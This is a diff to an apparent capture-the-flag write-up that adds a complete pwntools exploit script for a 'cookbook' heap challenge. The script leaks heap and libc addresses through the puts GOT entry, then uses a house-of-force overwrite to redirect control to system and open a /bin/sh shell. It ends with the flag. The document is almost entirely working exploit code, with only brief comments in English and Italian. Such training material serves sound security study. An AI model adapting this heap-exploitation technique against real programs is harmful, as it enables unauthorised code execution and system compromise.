@@ -139,6 +139,141 @@ SYSTEM_OFFSET = 0x4d200
 
 ### Exploit
 ```python
-recuperare da VM
+from pwn import *
+import time
+
+#from Ghidra
+CUR_INGREDIENT = 0x0804d09c
+CUR_RECIPE = 0x0804d0a0
+
+#from libc file
+PUTS_OFFSET = 0x77b40
+SYSTEM_OFFSET = 0x4d200
+
+#from gdb
+HEAP_BASE_OFFSET = 0x1878 #leak address
+# 1) leak heap address
+# 2) get current heap base from gdb with info proc mappings
+# 3) compute the difference
+# 4) notice that is always 0x1878, taaaaaac
+
+context.terminal = ['terminator', '-e']
+
+
+elf = ELF('./cookbook')
+r = elf.process()
+libc = ELF('./libc-2.27.so')
+addr = elf.got['puts']
+print("adddddr: {0}".format(hex(addr)))
+
+#r = process("./cookbook", env={'LD_PRELOAD': './libc-2.27.so'})
+gdb.attach(r, """
+	c
+	""")
+
+
+#r = remote("training.jinblack.it", 2017)
+#input("wait")
+
+print("==================================================")
+print("STARTING EXPLOIT")
+
+r.recvuntil("name?\n")
+
+r.send(b"grigg0\n")
+
+
+r.recvuntil("uit\n")
+
+print("==================================================\nStep 1 - LEAKING HEAP... ")
+
+r.send("c\n")
+#time.sleep(0.1)
+r.send("n\n")
+#time.sleep(0.1)
+r.send("g\n")
+#time.sleep(0.1)
+
+r.send("AAAA\n")
+#time.sleep(0.1)
+r.send("a\n")
+#time.sleep(0.1)
+r.send("basil\n")
+#time.sleep(0.1)
+r.send("1\n")
+#time.sleep(0.1)
+r.send("d\n")
+#time.sleep(0.1)
+r.send("p\n")
+r.recvuntil("AAAA\n\n")
+
+leaked_chunk = hex(int(r.recvuntil(" ")[:-1]))
+print("[x] LEAKED HEAP CHUNK ADDR = {0}".format(leaked_chunk))
+
+heap_base = hex(int(leaked_chunk, 16) - HEAP_BASE_OFFSET)
+print("[x] COMPUTED HEAP BASE ADDR = {0}".format(heap_base))
+
+top_chunk = hex(int(heap_base,16) + HEAP_BASE_OFFSET - 0x2)
+print("[x] *maybe* COMPUTED TOP CHUNK ADDR = {0}".format(top_chunk))
+
+# funziona fino a qua
+print("==================================================\nStep 2 - LEAKING LIBC... ")
+r.send("c\n")
+r.send("n\n")
+r.send("d\n")
+r.send("q\n")
+r.send("g\n")
+r.send("40c\n")
+r.sendline(b'\x00'*8 + b'A'*115 + b'B' + p32(addr))
+r.send("c\n")
+r.send("p\n")
+
+r.recvuntil("AAAB")
+
+r.recvuntil("recipe type: ")
+leaked_puts = hex(u32(r.recv(4)))
+print("[x] LEAKED PUTS GOT ADDR = {0}".format(leaked_puts))
+
+libc_base = hex(int(leaked_puts,16) - PUTS_OFFSET)
+print("[x] COMPUTED LIBC BASE ADDR v1 = {0}".format(libc_base))
+
+libc_base = hex(int(leaked_puts,16) - libc.symbols['puts'])
+print("[x] COMPUTED LIBC BASE ADDR v2 = {0}".format(libc_base))
+
+#print("my_off {0}, x_off {1}".format(hex(PUTS_OFFSET), hex(libc.symbols['puts'])))
+
+#sys_libc = hex(int(libc_base,16) + SYSTEM_OFFSET)
+#print("[x] COMPUTED LIBC SYSTEM ADDR v1 = {0}".format(sys_libc))
+
+sys_libc = hex(int(libc_base,16) + libc.symbols['system'])
+print("[x] COMPUTED LIBC SYSTEM ADDR v2 = {0}".format(sys_libc))
+
+# in teoria giusto anche fino a qua
+
+r.sendline(b'c')
+r.sendline(b'n')
+r.sendline(b'g')
+r.sendline(b"\x00"*0x380 + b'\xff'*4)
+r.sendline(b'q')
+r.recv()
+
+r.sendline(b'g')
+size = (0x0804d09c - int(top_chunk,16) - 0x428)&0xffffffff
+print("SIZE: {0}".format(size))
+r.sendline("0x%x" %size)
+r.recv()
+r.sendline(b'g')
+r.recv()
+r.sendline("0x%x" %0x30)
+r.sendline(p32(0x0804d000)*12)
+r.recv()
+r.sendline(b'a')
+r.sendline(b'g')
+payload = b'/bin/sh\x00\x00\x00\x00' + p32(int(sys_libc,16))*32
+r.recv()
+r.sendline(payload)
+r.recv()
+
+r.interactive()
 ```
 **flag{house_of_force_once_again!}**
